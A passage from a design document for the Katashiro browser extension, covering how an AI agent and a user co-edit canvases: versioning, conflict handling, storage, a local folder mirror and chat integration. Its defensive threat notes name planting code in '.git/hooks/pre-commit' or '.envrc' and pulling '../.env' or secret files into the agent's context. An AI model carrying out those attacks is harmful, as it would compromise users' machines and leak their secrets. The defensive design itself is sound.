    (`prosemirror-history` `undo` / `redo`, the same stack as Ctrl/⌘+Z and Ctrl/⌘+Shift+Z inside
    the editor). The host sends `editCmd{cmd: "undo" | "redo"}` to the frame on the nonce channel;
    the frame reports `undoState{canUndo, canRedo}` (from `undoDepth` / `redoDepth`) whenever it
    may have changed, and the buttons enable from it. A compare tab never edits, so it refuses
    `undoState` like `save` / `dirty` (§3.2). Clicking a button does not move focus out of the
    editor, and Ctrl/⌘+Z pressed while focus is in the header still reaches it. The stack lives only as long as the editor: it starts empty on ✏️ 編輯 (loading the
    canvas is not an undoable step), survives a save (undo past it makes the editor dirty again;
    nothing stored changes until the next save), and is dropped on leaving edit mode. **Agent
    writes cannot be undone by the editor:** an agent write is never a step in it (a clean editor
    gives way to the new version, a dirty one keeps going and meets the conflict view). To go back
    on an agent write, use Revert to agent's (only the agent's last write), ask the agent, or the
    folder mirror under git (§3.6).
  - **The agent cannot read old versions:** `canvas_read` returns the latest, as before. What
    history adds for the agent is the stale diff: it exists whenever `baseVersion` is still in
    history (below).
  - **Normalization (below) rewrites history like the agent copy:** the entry of the agent's
    version gets the normalized text. History stores what the latest was.
  - **Existing canvases migrate lazily:** a canvas stored before history starts its history on its
    next write, from its latest (and its agent copy, when that differs); until then it reads as a
    history of those one or two versions.
  - Longer history is the user's choice: the folder mirror under git (§3.6).
- **Optimistic concurrency, agent side.** An agent update carries `baseVersion` (required with
  `id`). If the canvas has moved on (the user edited it), the call is **rejected** with a
  structured error, not the whole document:
  `{error: "stale", currentVersion, author, diffFromBase}`. `currentVersion` is the latest version
  number, and `diffFromBase` is a unified diff from `baseVersion` to it. The agent can rebase on the
  diff without re-reading up to 2 MB. The diff exists whenever `baseVersion` is still in the
  canvas's history (Brett, 2026-10-11; before history only when it was the agent's last write, the
  usual case: the agent wrote, then the user edited); a base trimmed out gives `diffFromBase: null`
  and the agent calls `canvas_read`. A user's edit is never silently overwritten.
- **`canvas_patch` rebases itself.** All `find`s are matched against **one snapshot of the latest
  version**, not `baseVersion` and not each other's output. Each must match exactly once, and the
  matched ranges must not overlap. Then all replacements apply together; otherwise none do and the
  call is rejected (with the error above), so one `replace` can never create a match for the next.
  On success after the canvas has moved on, the result carries `rebasedOver: {version, author}` so
  the agent knows the user edited in between. The common case, "the user edited section A, the
  agent patches section B", does not conflict.
  *As implemented:* a miss on a canvas still at `baseVersion` is not `stale` but
  `{error:"patch", edit, count}` (0 = no match, n = ambiguous; `overlaps` names the other edit).
  That includes a late normalization (below): it keeps the version, and the agent's raw text is
  not kept, so there is no diff to give; the miss message says to `canvas_read`.
  A successful rebase also returns `rebasedOver.diffFromBase` (`baseVersion` → the latest it
  patched, same rule and cap as the `stale` diff), because the write records `agentSeenVersion` as
  the new version; when it is `null` (base no longer in history, or the diff too large) the result tells the agent to `canvas_read`. The budget check runs on
  a lock-free dry run before the lock (§3.6 lock order); if the locked run succeeds where the dry
  run missed, that write skips the check and the soft cap can be exceeded by one canvas, the same
  race `canvas_open` updates already have.
- **User side: unsaved edits are never eaten.** If the user has unsaved changes when an agent
  version arrives, the frame does not re-render. The host stores the agent's write and shows
  *"Agent saved vN — view / keep editing"*. When the user then saves, their `save{baseVersion}` is
  stale, and the host opens a conflict view (their text beside the latest version) where they
  choose: keep mine (saved on top as the latest), or discard mine. If the editor is clean, the new
  version renders directly.
- User edits reach the agent through `canvas_read`, or when the user presses **Send to agent**
  (§3.7). Nothing is noted automatically (§6 Q4, decided).
- **`agentSeenVersion`.** `meta` records the latest revision the agent has seen, updated on every
  agent write and every `canvas_read`. Send to agent is enabled only when
  `version > agentSeenVersion`, and its header says *"agent last saw vN"*, so edits the agent has
  already read are not pushed again as new. The diff base stays the agent's last write (its pinned
  history entry); no extra content is stored for it. (A `stale` whose `baseVersion` is a user
  revision has a diff too, while that version is in history.)
- **Destructive actions.** *Revert to agent's* (replaces the user's latest) and *discard mine* in
  the conflict view each ask for confirmation. Revert is a new version, so the replaced text stays
  in history, but nothing in the tab brings it back (no version walking, above): the dialog says
  *"This cannot be undone"* unless the folder mirror holds it (as before #117). *Discard mine*
  throws away unsaved text, which was never a version: it cannot be undone. Deleting a canvas
  deletes its history with it. Importing an outside file change is never automatic (§3.6,
  `author: "file"`).
- Editors: **Milkdown crepe for `markdown` (phase 1)**, and CodeMirror 6 source + live preview for
  `slides` (phase 2). **Both run inside `canvas-frame.html`, never in the `html` frame.** The host
  receives only the saved markdown string via `save{}`. Milkdown's markdown is the stored format,
  so agent and user edit the same text with no conversion step. Saved markdown is rendered through
  the same markdown-it + DOMPurify sink as agent markdown; the editor's own DOM is never persisted.
- **Milkdown normalizes markdown, and the stored text is the normalized text.** Parsing and
  serializing rewrites formatting (`*` → `-`, escaping, blank lines, table alignment). Left alone,
  a one-character user edit would save as a fully reformatted document, so the agent's `find`s
  (written against its own original text) would miss and `diffFromBase` would cover everything.
  So:
  - **Agent writes are normalized on render — `markdown` kind only** (`slides`, `chart` and the
    others are stored as sent). The frame normalizes with Milkdown's parser + serializer alone, no
    editor view, so it does not depend on how the canvas is displayed. After rendering an agent
    `markdown` version, the frame sends `rendered{version, normalized}`. The host accepts
    `normalized` only from `canvas-frame.html` with the current nonce, only for the `version` it is
    waiting on, and only up to 2 MB (as `save`); anything else is ignored. If two tabs of the same
    canvas both answer, the first wins (normalization is idempotent, so they agree). Under the
    `canvas:<id>` lock the host **always** replaces the `agent` copy with `normalized` (if
    `agentVersion` is still that version), and replaces `latest` **only if `meta.version` still
    equals it** (the user may have saved since). With history (2026-10-11) the agent copy is that
    version's history entry (`latest` while it is the latest, else `canvas:<id>:v:<n>`), and its
    recorded size follows. Author stays `agent`; `canvas_read`, the
    Send-to-agent diff and `diffFromBase` all use the normalized text.
    The tool result waits for this (with a timeout) and carries `normalizedDiff` when the text
    changed. The panel learns of it through `storage.onChanged` on `canvas:<id>:meta`, whose entry
    for that version flips to `normalized: true` (no extra runtime message), and computes the diff
    from the raw text it wrote, so the agent's next `find` targets what is actually stored. If no frame renders in
    time (tab closed), the version is stored raw with `normalized:false` and normalized on the
    next open, by the same rule: the `agent` copy always, `latest` only if still that version.
    (Normalizing only `latest` would make every agent-vs-latest diff span the whole document.) A
    late result (after the timeout) is applied under the same rule; a `canvas_patch` whose `find`
    then misses gets the `stale` error with a diff.
  - Normalization must be **idempotent** (serializing its own output changes nothing); the
    Milkdown smoke test asserts it.
- **Only an explicit user save creates a user version.** `save{}` is sent on Ctrl+S or the Save
  button, never on editor change events (an autosave, if added, counts only `isTrusted` input).
  "Dirty" is measured against the **normalized** text loaded into the editor, not the agent's
  original, and a save whose text equals the current version creates no version. Loading or
  re-rendering agent content therefore never produces an `author:"user"` version, never makes the
  next agent write `stale`, and never enables Send to agent.
  The editor's markdown is **cleaned** before it counts as dirty or is saved
  (`CanvasCore.cleanEditorMarkdown`, also applied to normalized agent text), outside code fences
  only: Milkdown's `<br />` empty-paragraph lines become blank lines, runs of blank lines collapse
  (#103), and **trailing spaces/tabs on a line that ends a block** (the next line is blank, or it is
  the last line) are dropped (2026-10-11: Space pressed to scroll in edit mode had saved 97 spaces at
  a paragraph's end). Two trailing spaces before a next line of the same paragraph are a hard break
  and stay. A save that only adds such spaces or blank lines is "unchanged", and the notice says
  why; the editor is reset to the saved text only when blank lines went (invisible spaces alone do
  not reset it, so a space typed before the next word is not eaten).
- **View and edit are separate modes.** A `markdown` canvas is displayed read-only through
  markdown-it + DOMPurify (the chat's sink). Milkdown is mounted only when the user clicks Edit, and
  unmounted on leaving edit mode, so the unsanitized path below exists only while the user edits.
- **Editing is a second render path.** Milkdown parses agent markdown straight into ProseMirror DOM
  without DOMPurify; the "same sink" above covers only saved text. What holds it is
  `canvas-frame.html`'s CSP (`script-src 'self'`, `img-src data: blob:`, `connect-src 'none'`) plus
  link interception. In addition: Milkdown's `html` node renders as plain text, never `innerHTML`;
  crepe features we do not use are disabled (image-by-URL input, remote image loading, uploads);
  and CodeMirror language packages are vendored, never loaded dynamically.

### 3.6 Storage and ownership

- `chrome.storage.local` with the `unlimitedStorage` permission. Per canvas, one body per version
  in its history (§3.5):
  - `canvas:<conversationId>:index` — the conversation's canvases with title, kind, version and
    byte size.
  - `canvas:<id>:meta` — title, kind, `conversationId`, `version`, author and time of the latest,
    `agentVersion`, last opened, and **`history`**: `[{v, author, at, bytes, image?, imageBytes?}]`,
    oldest first, the last entry being the latest (sizes and authors only, no content). A meta
    written by #117 may still carry `walk` (the removed ↶ / ↷ walk state, §3.5): it is never read,
    and the canvas's next write drops it.
  - `canvas:<id>:latest` — the latest content (the newest history entry).
  - `canvas:<id>:v:<n>` — the content of every other version in history (the agent's last write
    among them while it is not the latest). A write moves the old latest here in the same `set()`
    as the new latest and meta, then removes the trimmed versions' keys (best effort: a failed
    remove leaves orphan `v:<n>` keys, which are not counted in the footprint and are cleared when
    the canvas is deleted, on Chrome 130+ where `storage.getKeys` exists; a small leak on older
    Chrome, accepted).
  - `canvas:<id>:agent` — only on canvases stored before history: the agent's last write while it
    differed from the latest. The next write moves it into `v:<agentVersion>` (lazy migration).
- **The cap is a byte budget** (200 MB, §6 Q3; a `canvas:budgetBytes` storage override can lower
  it for testing, see docs/testing.md). **A canvas's footprint is its whole history** (Brett,
  2026-10-11): the sum of its versions' sizes, each a full copy, with an image canvas's image
  counted once per distinct image. So a canvas costs up to N + 1 copies of its text plus its
  images, and the budget is reached by many canvases, long histories of large canvases, or many
  images. Over budget, the host drops **whole canvases** (history included), least recently opened first (never one open
  in a tab), after asking once; it never trims history to make room. **The question is asked in the panel** (the agent's write arrives
  there, and no canvas tab may be open): *"Canvas storage is full — remove N least-recently-opened
  canvases?"*, on the same non-blocking confirm card as `canvas_delete` (§3.4, #80; the write waits
  on it holding no lock). If the user declines, does not answer within 2 minutes, the asking agent's
  turn has ended (no card then, #80), or the panel cannot ask, that write fails with `{error: "quota"}` and nothing is written.
- **Sizing.** Text is small: a long markdown document is ~20–100 KB, a slide deck's markdown
  ~50–300 KB, so even 1 000 canvases of text stay under ~200 MB. **Images dominate**, so they are
  stored **once, by content hash** (`canvas:img:<sha256>`), and contents refer to them; two copies
  of a canvas, or two canvases, sharing an image store it once. 200 MB holds roughly 30 distinct
  full-size images plus a great deal of text. It is a setting, `chrome.storage.local` with `unlimitedStorage` sits on the
  user's disk, and `getBytesInUse` is shown in Settings so the user sees what it costs.
- **Two writers, one lock.** The panel writes agent saves and a canvas tab writes user saves,
  and `chrome.storage` has no transactions: two read-check-write sequences can both pass the
  `baseVersion` check and the later one overwrites `meta` or the index, which would break §3.5 at
  the bottom. So every read → check → write on a canvas runs inside
  `navigator.locks.request('canvas:<id>', …)` (Web Locks are shared by all pages of the extension
  origin), and index updates and eviction take `canvas:index`. A single writer would avoid locks,
  but canvas tabs must still save while the panel is closed (§3.9).
  **Lock order is fixed: `canvas:<id>` before `canvas:index`, never the reverse.** A save holds
  `canvas:<id>` and then takes `canvas:index` to update the index. Sweep and eviction hold only
  `canvas:index` and read canvases **without** taking per-canvas locks; the "skip images written in
  the last 10 minutes" rule covers a save in flight. Dropping a canvas during eviction does take
  its `canvas:<id>` lock, so eviction first releases `canvas:index`, takes `canvas:<id>`, then
  `canvas:index` again, and re-checks that the canvas is still unopened and over budget.
- **Images: no stored reference counts.** Without transactions, a crash between "write content" and
  "increment count" leaves the count wrong: too low deletes a live image, too high keeps it
  forever. Instead:
  - **Write order:** `canvas:img:<hash>` first, then the content that references it.
  - **Sweep** under the `canvas:index` lock (after a save that replaces content, and before
    eviction): scan every version in every canvas's history (`latest`, `v:<n>`, and the legacy
    `agent` copy) for image hashes, so an image an older version still shows is kept; delete images nobody
    references, and skip images written in the last 10 minutes (content referencing them may still
    be on its way).
  - **Count real bytes freed.** Dropping a canvas frees its text, and an image only once nothing
    else references it; eviction counts what was actually freed.
  - **`imageId` is copied in.** A screenshot passed by `imageId` is copied into `canvas:img:` at
    write time, not referenced in `show_image`'s temporary store, which is cleared.
- **Keyed by `conversationId` from day one** (already minted by #61), so multi-conversation needs no
  migration. Until it lands, the window's conversation owns its canvases
  ([multi-conversation](./multi-conversation.md) §3.2 moves only the chat history).
- **Incognito is not supported (#109).** This ADR first had incognito canvases in
  `storage.session`, like the chat history (#54), but the implementation wrote them to
  `storage.local` (on disk) marked `meta.noMirror` and only skipped the folder. Instead of a
  second storage area, Katashiro no longer runs in incognito at all: `manifest.json` sets
  `"incognito": "not_allowed"`. What the user sends the agent cannot be made forgotten on the
  agent side, so an incognito promise could not be kept anyway. The chat history is therefore
  always in `storage.local` too. Canvases incognito panels stored before (`meta.noMirror`, set only
  there) are removed by the service worker on install/update and on browser start (`onInstalled` /
  `onStartup` → `store.removeIncognitoLeftovers()`, through `store.remove`, so index and budget stay
  consistent, with one image sweep after all of them; best effort and idempotent). Until that has run, `noMirror` is still read: the
  mirror skips such a canvas and the gallery does not list it.
- If `chrome.storage.local` becomes slow at this size, move content bodies to IndexedDB on the
  extension origin (the host page owns the reads and writes either way).

**Local folder mirror (Brett, 2026-10-10).** `chrome.storage.local` lives only in this Chrome
profile: it does not sync, it is wiped if the extension is removed, and nothing backs it up. So the
user can pick a **folder on disk** (Settings → *Save canvases to a folder*), and Katashiro mirrors
every canvas there as plain files, which the user can put under git, Dropbox or Time Machine.

- **API:** File System Access, `showDirectoryPicker({mode: "readwrite"})` from an extension page
  (Settings in the panel), on a user click. The `FileSystemDirectoryHandle` is kept in IndexedDB on
  the extension origin (handles do not fit in `chrome.storage`), so both the panel (agent writes)
  and `canvas.html` (user saves) can use it. **Sandbox frames never get it** (opaque origin, §3.2).
- **Layout:**
  ```
  <folder>/
    <conversation-slug>/
      <canvas-slug>.md            # markdown and slides (slides keep their --- separators)
      <canvas-slug>.assets/       # images, <sha256>.<ext>, linked relatively from the .md
    .katashiro/<canvasId>.json    # id, kind, title, slug, hash last written — informational only
  ```
- **Paths come only from storage (never from the folder).** A file path is always computed from
  the slugs kept in the canvas `meta`: `<conv-slug>/<canvas-slug>.md` and
  `<conv-slug>/<canvas-slug>.assets/<sha256>.<ext>`. Before every write the path is checked against
  exactly that pattern, and anything else is refused. `.katashiro/*.json` is written for humans
  and tools but **never read for paths**: if it were, a tampered json (via `git pull`, a synced
  folder, another program) could point a canvas at `.git/hooks/pre-commit` or `.envrc`, and the
  next agent write would plant code there. (`getFileHandle` already refuses `..` and `/`, so this
  is about files *inside* the chosen folder.) The hash last written, `fileSyncedVersion` and the
  slugs live in `meta`, not in the json.
- **Slugs.** Conversation and canvas titles may come from the agent, so: lower-case, only
  `[a-z0-9_-]` and CJK characters, other characters become `-`; never starting with `.`; not
  `.git`, `.katashiro`, `node_modules` or a Windows reserved name (`CON`, `PRN`, `AUX`, `NUL`,
  `COM1`–`9`, `LPT1`–`9`); at most 80 characters; empty becomes `canvas`; collisions get `-2`,
  `-3`, …. A slug is fixed when assigned; a rename computes a new one and moves the file (below).
- **Assets.** Extension from an allow-list (`png`, `jpg`, `gif`, `webp`), chosen by the file's
  **magic bytes**, never by an agent-supplied MIME type. **SVG is never written as a file**: opened
  from `file://` it runs script. (SVG stays inside storage and the sandbox.)
- **Write-through (phase 1), without clobbering outside edits.** After every save (agent or user),
  the latest content is written to its file (only the latest: history versions are never
  mirrored). Katashiro keeps only the last N versions (§3.5), so
  **committing the folder to git is how the user keeps longer history**. Before
  writing, Katashiro hashes the file on disk and compares it with the hash it last wrote:
  - same (or no file yet) → overwrite;
  - different (edited in VS Code, `git pull`, …) → **do not overwrite**: write
    `<canvas-slug>.katashiro-<timestamp>.md` beside it, and the canvas header shows *"The file was
    changed outside Katashiro"*;
  - a file Katashiro never wrote already sits at the path → treated as "different".
  A rename **moves** the file (`FileSystemFileHandle.move()`, #101, below), so an outside edit
  stays with it; where `move()` is not available or fails, the old file is removed only if its
  hash still matches, and the new one is written fresh. Writing only files whose hash matches also
  covers symlinks planted in the folder (whether File System Access follows them is to be tested).
- **Read-back (phase 2) detects; the user decides.** When a canvas tab opens or regains focus, and
  before `canvas_read`, the file's hash is compared with the one last written. A change is
  **never imported automatically**: anyone who can write the folder (a git remote, a Dropbox
  share) could otherwise put words in the user's mouth, the same class of problem as B3/P1.
  - The canvas tab shows *"File changed outside Katashiro — view diff / import / ignore"*.
  - **Import** creates a save with **`author: "file"`** (a third author, not `user` plus a
    flag). If the canvas also changed in storage since, the §3.5 conflict view opens instead.
  - `canvas_read` marks content whose author is `file` as *"external file, not an edit confirmed
    by the user in Katashiro"*, and returns `fileChanged: true` while a change is pending import; it never
    returns the un-imported file text.
  - Send to agent includes `file` saves under the §3.7 data-block rules.
  - A deleted file marks the canvas *file missing*; it never deletes the canvas.
- **Imported markdown references only its own assets.** `![](…)` is resolved only when it matches
  `<canvas-slug>.assets/<sha256>.<ext>`, the bytes hash to that name and the magic bytes are an
  allowed image. Every other relative path (`../.env`, `config/secrets.json`) is left as plain
  text and never read; otherwise one line in a `.md` could pull any file in the folder into the
  canvas and, through `canvas_read`, into the agent's context.
- **Locks and catch-up.** Files are written under the same `canvas:<id>` lock as storage (§3.6),
  storage first, then the file. `meta.fileSyncedVersion` records the last revision written to
  disk; on reconnect, every canvas behind is written, with the same hash check (the file may have
  changed while disconnected).
- **Who writes.** `requestPermission` needs a user gesture, and the service worker cannot use File
  System Access, so only the panel and `canvas.html` write files.
- **Reinstalling the extension** loses storage and the IndexedDB handle; the folder stays.
  Restoring canvases *from* the folder is not in phase 1–2. If it is added, every file and json in
  the folder is untrusted input: imports are `author: "file"`, and the path, slug and asset rules
  above apply.
- **Permission:** a grant lasts for the browser session. After a restart Chrome may ask again
  (unless the user chose a persistent grant; to verify for extension origins). Until the user
  clicks *Reconnect folder* in the canvas header, writes stay in storage and are flushed on
  reconnect. Storage is always the working copy; the folder is a mirror, so a missing permission
  never loses data.
- **No incognito**: Katashiro does not run in incognito (above, #109), so no incognito panel
  writes to the folder.

**Phase 1 implementation (PR 7).** `canvas-mirror.js` decides (slugs, path check, write plan,
conflict names; unit-tested on a fake directory handle) and makes the few File System Access
calls; the handle lives in IndexedDB `katashiro-canvas-mirror`. Settings → *畫布存到資料夾* picks,
reconnects or stops (the files stay; picking a folder used before — the current one or the 3
before it — keeps its hashes). The panel
syncs a canvas on every `storage.onChanged` of its content or meta (so agent writes and
normalization), each canvas tab syncs its own saves and has *Reconnect folder*; both take the
`canvas:<id>` lock, and a sync whose content hash equals the last one synced does nothing. Writes
happen only while Chrome already grants access; nobody prompts without a click. Where this ADR
is silent, the conservative choice:
- The mirror state is `meta.file` (`{folder, convSlug, slug, slugBase, hash, syncedHash,
  jsonHash, conflictName, conflictHash, state}`, plus `convBase` — the folder name the title gives —
  and, while a rename is under way, `move`) plus `meta.fileSyncedVersion`; `folder` is an id
  minted per picked folder, so another folder starts over (no hashes, new slugs). The state for the
  last 3 other folders is kept in `meta.filesByFolder`, so going back to a folder (A → B → A) still
  knows which files Katashiro wrote there; a folder older than that starts over. Canvases an
  incognito window stored before #109 carry `meta.noMirror`; until the update removes them they are
  never written, by any page (no new canvas gets the flag).
- **A new slug never lands on an existing file.** When a canvas gets a slug in a folder (first
  write, rename, new folder), a path whose `.md` already exists (a deleted canvas's file, the
  user's own) is skipped for the next free `-2`, `-3`, …, so that file is neither overwritten nor
  turned into a conflict on every save. The "a file Katashiro never wrote → different" rule above
  still covers a file that appears there after the slug is assigned.
- `fileSyncedVersion` also moves on when a new version has the same content as the file (an agent
  rewrite with the same text), so the Revert dialog does not under-promise.
- **One file write per agent markdown write (#98).** Such a write is stored raw and normalized by a
  canvas tab moments later without a version bump (§3.5); mirrored at once, the file would be
  written twice. So while a canvas tab of it is open, the panel's and the tab's syncs hold the
  write (`{action:"held"}`, `CanvasMirror.createNormalizeHold`) until the normalization lands, at
  most 5 s (just over the tool result's 4 s wait); past that the raw text is written as before, and
  the normalization is a second write. A new canvas waits too (`canvas_open` opens its tab right
  after the write; the tab's start check holds while there is no file yet). With no canvas tab open,
  or a tab with unsaved edits (it renders nothing), it is written at once. A user save is never
  held, nor 📁 重新寫入, nor the start check of an existing file (it looks for outside changes).
- **The conversation folder is `<7-char short id>-<title slug>`** (Brett 2026-10-11; multi-
  conversation §7), e.g. `9f2a41d-市場調查`: the short id keeps two conversations with the same
  title apart and the folder recognisable after a rename. The title is read from the conversation
  index (`conv:index`, written by the panel; the mirror only reads it); an untitled conversation's
  folder is the short id alone; a conversation with no index entry (deleted) keeps the folder it
  has, and an id not of the `c_<12 hex>` shape keeps the slugged id. Before multi-conversation it was the slugged
  `conversationId` (`c_…`); those folders are moved to the new name like any rename (below), on the
  next sync of each canvas (the panel's catch-up on start syncs all). Slugs are also capped at 160
  UTF-8 bytes, so a conflict file name stays under the common 255-byte limit.
- **Renames move files (#101).** A canvas rename (new canvas slug) and a conversation rename (new
  folder) move that canvas's files with `FileSystemFileHandle.move(dir, name)`, one file at a time:
  Chrome cannot rename or move a directory (Chromium 40198034), so a new directory is created, the
  files moved into it, and the old directory removed once empty (non-recursive: anything left in
  it keeps it).
  - **What moves:** the `.md` (if Katashiro ever wrote it: `meta.file.hash` set, whatever is in it
    now — an outside edit moves with it, and the usual rules then apply at the new path: ours →
    written over, changed → conflict file; already gone → a deletion outside, so the canvas is marked
    deleted as in 1B below rather than written again under the new name, and nothing else of that
    canvas moves either: its conflict file and assets stay where they are, no new folder is made); the current conflict file named in `meta.file`
    (renamed to the new slug, same time tail); and the files in `<slug>.assets/` whose name is a
    valid asset name **and** whose bytes hash to it (content-addressed, so they are ours or
    identical to ours). Older conflict files, anything else in `.assets/` or in the conversation
    folder (the user's notes) are unknown and never moved. The `.katashiro/<id>.json` does not move.
    Known gap: an image canvas's `.md` edited outside moves as it is, so it still links
    `<old-slug>.assets/` while the assets moved; it becomes a conflict at the new path (changed →
    conflict file) and its image link is broken until the user fixes or drops their edit. Rare,
    accepted. Likewise a fallback write cut short before the final write, with the canvas changed
    meanwhile, sees its own new file as a conflict on resume (unchanged → adopted).
  - **Never overwrite.** `move()` silently replaces an existing target (verified in real Chrome
    2026-10-11), so the target is checked first: anything there (file or directory) means that file
    is not moved. For the `.md` it then falls back as below, and the file at the new path gets the
    usual "never wrote it → conflict file" treatment. An asset whose target already holds the same
    bytes is a duplicate and the source is removed (content-addressed, nothing is lost); a
    different one is left. (A check-then-move window of a few ms remains, as for writes: File System
    Access has no compare-and-swap.)
  - **Paths only from meta:** source and target are computed from the old and new slugs in
    `meta.file` and each is checked with `isAllowedPath` for its canvas; directories removed are only
    `<conv-slug>/` and `<conv-slug>/<slug>.assets/` of that canvas's old location.
  - **Fallback:** no `move()`, or it throws (e.g. a file held open by an editor on Windows) → that
    file is handled as before #101: the `.md` is written fresh at the new path and the old one
    removed only if its hash still matches; an asset stays where it is (an image canvas's current
    asset is written to the new `.assets/`). A permission error still reads as disconnected.
  - **Interruption-safe and idempotent.** Before the first file moves, the pending move (old slugs,
    the `.md` hash, the conflict file's name and hash) is recorded in `meta.file.move` under the
    `canvas:<id>` lock (with the new slugs, in the same storage write). The move record is cleared
    by the sync's final write; a sync cut short (Chrome closed, an error) leaves it, and the next
    sync of that canvas finishes the move first: source there and target free → moved; source gone
    and target there → already moved; both there → the target is not ours to overwrite (fallback).
  - **When folders move (titles change often).** A title change by itself moves nothing: moves
    happen only in a sync. The panel watches `conv:index` and, once a conversation's title has
    stayed the same for 10 s (`TITLE_SETTLE_MS`), syncs that conversation's canvases
    (`syncConversation`), so a rename followed by another (auto title, then `set_title`, then the
    user's) moves the folder once. A canvas saved in between is synced at once as always and so moves
    on its own; its siblings follow when the title settles, on their next save, or at the panel's
    catch-up. With the panel closed nothing renames a conversation anyway (titles change in the
    panel).
- **One conflict file per episode:** while the main file stays changed, later saves rewrite the same
  `.katashiro-<time>.md` as long as it is still exactly what Katashiro wrote there; once the user
  edits it too, a new one is made. If the disk already holds exactly the new content, it is adopted
  (nothing written). For a file Katashiro never wrote, this can only happen when the file appeared
  at the path after the slug was assigned: a new slug skips any existing `.md` (above) (#98).
- Known limit: between hashing the file and the swap file's move into place (`createWritable` →
  `close`) is a window of a few ms in which an outside write would be overwritten. File System
  Access has no compare-and-swap; the window is accepted.
- **A file deleted outside** is detected when a canvas tab opens and on any sync. The canvas is
  never deleted. **Decided (Brett, 2026-10-11): the deletion is taken as meant** — the canvas is
  marked `state: "deleted"` ("📁 檔案已刪除，不再同步") and nothing is written for it any more,
  not even on later saves, until the user clicks **📁 重新寫入** in the canvas header (`sync(id,
  { rewrite: true })`), or the file comes back outside (a `git checkout`), after which the usual
  rules apply (ours → written over, anything else → conflict file). 重新寫入 always looks at the
  disk, even when the content has not changed since the last sync: a missing file is written back
  (`state: "ok"`); one already back with our content just resumes ("ok", nothing written); one back
  but changed outside is not overwritten — the latest goes to the usual conflict file. The header
  says which happened (real-Chrome finding 2026-10-11: with unchanged content the click did
  nothing). A rename to a new path is not a
  deletion (Katashiro never wrote there), but a file of ours found gone when a rename goes to move
  it is (#101). Outside changes are only detected on
  open in phase 1 (no focus check, diff or import; read-back stays phase 2).
- Deleting or evicting a canvas leaves its files. A rename moves them (above; before #101 it
  removed the old `.md` only when its hash matched and left the old `.assets` files). Assets of a
  replaced image stay in `.assets/` (and move with it). An existing asset file is never overwritten
  (content-addressed: it is either ours or left alone).
- Image canvases are written as `![caption](<slug>.assets/<sha256>.<ext>)`; an SVG or
  unrecognised image is not written, and the `.md` says it is kept in Katashiro only.
- The Revert-to-agent's dialog (kept as is, Brett 2026-10-11) drops "cannot be undone" only while the folder holds this exact
  revision, and then says the old text survives only if the folder was committed to git (the
  write-through overwrites the file right after). *Discard mine* always says it cannot be undone:
  unsaved text never reached the folder.
- To verify in real Chrome: `showDirectoryPicker` from the side panel; whether a grant survives a
  browser restart for an extension origin (persistent permissions); `requestPermission` after an
  IndexedDB read still inside the click's activation; whether File System Access follows a symlink
  planted in the folder; Chrome's refusal of some names or folders (e.g. the home folder);
  Windows' 260-character path limit (an asset path is up to ~80 + `.assets\` + ~70 characters
  under the conversation folder and the folder the user picked).
  For `move()` (#101): it works on handles from `showDirectoryPicker` in the extension origin, into
  a sibling directory, with an editor (VS Code; a Windows lock) holding the file open, and the
  overwrite of an existing target (seen 2026-10-11; the target check above is what prevents it).

### 3.7 Chat integration

- The card sits in the agent's turn, `📄 <title> · v<N>`, N being the revision that turn wrote.
  Clicking it opens the canvas (always the latest); if it has moved on, the header says *"updated
  since v<N>"*.
- **Reply-to** (#61) may quote a canvas, rendering `↩ 📄 title v3` (the revision it was at). History
  is short (§3.5) and the agent gets no old versions, so the quote carries **metadata only** (id,
  title, revision). Content is attached only if the `agent` copy is still exactly v3, and then as
  a §3.7 data block.
- `chat_history` records `[canvas "title" v3]` placeholders, not the content (as with images);
  `v3` is a revision label, not something that can be opened.
- **"Send to agent" button (Brett, 2026-10-10; §6 Q4).** User edits are **not** announced
  automatically. The agent reads them itself with `canvas_read` when it needs to (its tool
  description says so). When the user wants the agent to look now, the canvas header's **Send to
  agent** button posts one chat message, through the panel, as the user:
  `[canvas "X" v5 → v7, edited by user]` plus a unified diff from the last version the agent wrote,
  capped at 20 KB (beyond that, the line says so and the agent calls `canvas_read`), plus an
  optional note the user types. It is enabled only when there are saved user edits the agent has
  not been sent, and only for `canvas-frame.html` canvases (never on behalf of the `html` frame).
  **The diff is computed by the host from storage** (agent's last write → latest);
  the frame never supplies diff text.
- **Ideas adopted from Anthropic's artifacts** `[Artifacts]`:
  - **Edit with agent on a selection** (phase 2): highlight text in the canvas, click *Ask agent*,
    type the request. It is sent like Send to agent, with the selected text quoted, so the agent
    knows exactly which part to change (`selection{}`, §3.2).
    *As implemented:* the frame posts `selection{}` in view mode only (debounced 250 ms; the
    editor's unsaved text is never quoted, since the agent could not find it in storage), for
    `markdown` and `slides`; the host shows **💬 Ask agent** while text is selected, and a small
    **💬** beside the selection (below its end, above it when there is no room below; never over the
    selected text unless the selection fills the view). Either opens a popover for the request (an
    empty one shows an inline hint and sends nothing). The host line is
    `[canvas "X" (<id>) v7, text selected by the user — as rendered, not the markdown source;
    canvas_read before canvas_patch]`: the selection is rendered text, so the agent reads the
    stored markdown before patching. It goes through the same `katashiro-canvas-push` path as Send
    to agent (panel sender checks, `reqId` dedupe, refused while no agent is connected).
    *Selection popover (Brett, 2026-10-12 16:07, option a — replaces the `window.prompt`, which
    blocked the page, took one line and looked out of place):*
    - **Drawn by the host, not the frame.** The 💬 and the popover are `canvas.html` elements
      positioned over the iframe, so canvas content (agent-authored) cannot draw, imitate or cover
      them. The frame only adds `rect` to `selection{}` (§3.2): the selection's bounding rect and
      the x of its end in the frame's viewport, left out while the selection is out of view (the
      💬 then hides). When the frame scrolls or resizes or a slide changes under the same
      selection, only the rect is re-posted, as `selectionRect{}` (once per animation frame, #125).
      An open popover follows its selection, and docks under the header button while the
      selection is out of view (#125). The host
      checks the numbers (finite, bounded), adds the iframe's offset and clamps to the frame box.
      Placement and key handling are pure functions (`CanvasCore.askPlace`, `askKey`, the state in
      `askReduce`).
    - **Popover:** a one-line excerpt of the selection (text only; whitespace, control and bidi
      characters flattened; Unicode Tag characters dropped, a ZWJ between emoji kept, the text in
      a `<bdi dir="auto">` so RTL content cannot move the 「」, #125), a multi-line note, **送出** and **✕**; `role="dialog"`. **Enter**
      sends, **Shift+Enter** is a new line, **Esc** closes; a key that belongs to an IME composition
      never sends or closes (`CanvasCore.imeKey`). The selection, the canvas version and its title
      are captured when the popover **opens** (as the old button click did), and the push is the
      same `composeAskAgent` + `katashiro-canvas-push`. The result shows in the popover
      (「💬 已問 <agent>」, then it closes); on an error it stays open with the note kept, to retry.
    - **Closing:** Esc, ✕, a click outside it (in the header, or into the canvas), entering edit
      mode, the canvas being deleted or its frame reloaded. While it is open, selection messages
